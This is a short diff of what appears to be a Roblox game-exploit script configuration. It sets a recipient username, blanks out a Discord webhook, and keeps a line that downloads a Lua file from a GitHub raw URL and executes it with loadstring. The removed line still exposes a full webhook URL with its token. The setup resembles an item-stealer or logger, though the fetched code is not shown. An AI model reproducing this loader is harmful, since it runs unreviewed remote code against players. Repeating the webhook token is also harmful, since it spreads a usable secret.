@@ -1,4 +1,4 @@
 UserName = "LilFraggg"
-WebHook = "https://discord.com/api/webhooks/1054415101286957106/KXItBKE4aQVO6xZMr0_n6832BxWZWP8NcLlZN5t7qMwJ0KJrjNJKDxO4R2SRIO_qY4I_"
+WebHook = ""
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
